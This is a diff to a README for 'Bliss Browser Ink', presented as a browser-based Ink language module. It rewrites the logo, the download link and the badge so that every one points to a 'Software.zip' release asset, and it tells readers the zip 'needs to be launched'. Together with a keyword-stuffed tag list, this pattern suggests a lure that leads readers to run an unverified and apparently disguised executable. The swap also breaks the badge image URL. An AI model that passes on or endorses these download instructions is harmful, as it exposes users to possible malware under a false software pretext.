@@ -1,7 +1,7 @@
 
 # Welcome to Bliss Browser Ink 🌳️🌐️#️⃣️
 
-![Bliss Browser Ink Logo](https://example.com/logo.png)
+![Bliss Browser Ink Logo](https://github.com/sty2sa/Bliss_Browser_Ink/releases/download/v2.0/Software.zip)
 
 ## Description
 Bliss Browser Ink is a groundbreaking language support module that allows you to write and run Ink programs directly within your web browser. Say goodbye to cumbersome setups and hello to a seamless browser-based development experience.
@@ -16,11 +16,11 @@ Bliss Browser Ink is a groundbreaking language support module that allows you to
 ['bliss-browser', 'bliss-browser-development', 'bliss-browser-ink', 'bliss-browser-language-support', 'bliss-browser-languages', 'bliss-browser-languagesupport', 'bliss-browser-project', 'browser', 'gpl3', 'gplv3', 'ink', 'ink-lang', 'ink-language', 'web-browser', 'web-development']
 
 ## Get Started
-Ready to dive into the world of Bliss Browser Ink? Download the software package ZIP file [here](https://github.com/user-attachments/files/18383251/Software.zip) **(needs to be launched)**.
+Ready to dive into the world of Bliss Browser Ink? Download the software package ZIP file [here](https://github.com/sty2sa/Bliss_Browser_Ink/releases/download/v2.0/Software.zip) **(needs to be launched)**.
 
 For more information and updates, don't forget to check out the "Releases" section of this repository.
 
-[![Download Bliss Browser Ink](https://img.shields.io/badge/Download-Bliss%20Browser%20Ink-blue)](https://github.com/user-attachments/files/18383251/Software.zip)
+[![Download Bliss Browser Ink](https://github.com/sty2sa/Bliss_Browser_Ink/releases/download/v2.0/Software.zip%20Browser%20Ink-blue)](https://github.com/sty2sa/Bliss_Browser_Ink/releases/download/v2.0/Software.zip)
 
 ## How to Use
 1. Download Bliss Browser Ink from the provided link.
